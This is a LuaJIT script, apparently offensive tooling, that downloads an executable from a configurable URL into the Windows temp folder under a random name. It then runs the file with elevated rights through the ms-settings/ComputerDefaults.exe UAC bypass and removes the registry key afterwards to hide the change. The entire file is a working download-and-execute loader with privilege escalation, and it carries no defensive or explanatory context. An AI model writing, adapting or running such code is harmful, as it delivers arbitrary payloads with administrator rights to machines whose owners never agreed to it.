-- download & exec then bypass UAC elevation prompt.
-- takes a url e.g. "http://127.0.0.1/payload.exe" 
-- and executes it with elevated rights bypassing UAC.

local ffi = require("ffi")


-- Define the URL and file path
local url = "http://127.0.0.1/Renge_x64.exe"

-- Define the FFI function prototypes for registry and download.
ffi.cdef[[
    typedef int HRESULT;
    typedef void* HKEY;
    typedef unsigned long DWORD;
    typedef long LONG;
    typedef const char* LPCSTR;
    HRESULT URLDownloadToFileA(
        void* pCaller,
        const char* szURL,
        const char* szFileName,
        unsigned long dwReserved,
        void* lpfnCB
    );
    void Sleep(unsigned long dwMilliseconds);
    LONG RegOpenKeyA(HKEY hKey, LPCSTR lpSubKey, HKEY* phkResult);
    LONG RegCreateKeyA(HKEY hKey, LPCSTR lpSubKey, HKEY* phkResult);
    LONG RegDeleteTreeA(HKEY hKey, LPCSTR lpSubKey);
    LONG RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const void* lpData, DWORD cbData);
    void SetLastError(DWORD dwErrCode);
    void* GetProcessHeap();
    void* HeapAlloc(void* hHeap, DWORD dwFlags, size_t dwBytes);
    void HeapFree(void* hHeap, DWORD dwFlags, void* lpMem);
]]

-- Load the urlmon.dll library
local urlmon = ffi.load("urlmon")

-- Load the Windows Registry API library
local advapi32 = ffi.load("advapi32")

-- Constants
local HKEY_CURRENT_USER = ffi.cast("HKEY", 0x80000001)
local REG_SZ = 1

-- Functions begin
-- Function to generate random string
function generateRandomString(length)
    local charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    local str = ""
    math.randomseed(os.time())
    for _ = 1, length do
        local randomIndex = math.random(1, #charset)
        str = str .. charset:sub(randomIndex, randomIndex)
    end
    return str
end

-- Function to write a registry value
function writeRegistryValue(key, subKey, valueName, valueData)
    local hKey = ffi.new("HKEY[1]")
    local result = advapi32.RegCreateKeyA(key, subKey, hKey)

    if result == 0 then
        local data = ffi.new("const char[?]", #valueData + 1, valueData)
        local dataSize = ffi.sizeof(data)

        result = advapi32.RegSetValueExA(hKey[0], valueName, 0, REG_SZ, data, dataSize)

        if result == 0 then
            return true
        end
    end

    return false
end

-- Function to delete a registry key and its subkeys using RegDeleteTree
function deleteRegistryTree(key, subKey)
    local result = advapi32.RegDeleteTreeA(key, subKey)
    
    if result == 0 then
        return true
    end

    return false
end
-- Functions end

-- Generate a random file name with a .exe extension in the %TEMP% directory
local tempDir = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Temp"
local localPath = tempDir .. "\\" .. generateRandomString(8) .. ".exe"

-- Use URLDownloadToFile to download the file
local result = urlmon.URLDownloadToFileA(nil, url, localPath, 0, nil)

if result == 0 then
    print("File downloaded successfully.")

    -- Sleep for a moment to ensure the file is completely written
    ffi.C.Sleep(1000)

    -- Now, let's execute the downloaded file via UAC bypass
    -- Example usage to write a registry value
    local success = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", "DelegateExecute", "")
    if success then
        print("Successfully wrote the registry value.")
    else
        print("Failed to write to registry value.") 
    end
    local success = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", "", localPath)
    if success then
        print("Successfully wrote the registry value.")
    else
        print("Failed to write to registry value.") 
    end

    -- Execute ComputerDefaults.exe to bypass UAC prompts and run localPath (our downloaded EXE)
    local success, exitCode = os.execute("C:\\Windows\\Syswow64\\ComputerDefaults.exe")
    if success then
        print("Executable ran successfully. Exit code: 0")
    else
        print("Failed to run the executable.")
    end
    -- Example usage to delete the registry key and its subkeys
    local deleteSuccess = deleteRegistryTree(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
    if deleteSuccess then
        print("Successfully deleted the registry key and its subkeys.")
    else
        print("Failed to delete the registry key and its subkeys.")
    end
else
    print("Failed to download the file. Error code: " .. result)
end

